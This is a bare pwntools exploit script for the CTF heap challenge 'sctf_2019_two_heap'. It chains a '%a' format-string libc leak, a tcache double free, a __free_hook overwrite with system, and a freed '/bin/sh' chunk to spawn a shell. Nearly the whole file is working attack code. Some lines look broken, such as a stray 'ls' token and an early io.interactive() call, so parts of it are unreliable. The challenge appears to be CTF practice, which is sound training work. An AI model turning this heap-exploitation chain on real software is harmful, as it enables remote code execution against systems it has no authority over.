from pwn import *

libc = ELF("/libc-2.27.so")

def add(size,data):
    io.sendlineafter("choice:","1")
    io.sendlineafter("size:\n",str(size))
    io.sendafter("note:\n",data)
def rm(idx):
    io.sendlineafter("choice:","2")
    io.sendlineafter("index:\n",str(idx))
while(True):
    try:
        #io = remote('node3.buuoj.cn',25285)
        io = process("./sctf_2019_two_heap")
        io.sendlineafter("SCTF:\n","%a%a%a%a")
        io.recvuntil("0x0.0")
        lbase = (int(io.recv(11),16)<<4)
        info("LBASE -> %#x"%lbase)
        io.interactive()
        add(1,'')
        rm(0);rm(0);ls
        add(8,p64(lbase+libc.sym['__free_hook']))
        add(0x10,'\n')
        add(24,p64(lbase+libc.sym['system'])+'\n')
        add(40,"/bin/sh\x00"+"\n")
        io.sendline("2")
        io.sendline("4")
        #gdb.attach(io,'handle SIGALRM nostop noprint')
        io.interactive()
        raw_input()
    except Exception,e:
        info(str(e))
        io.close()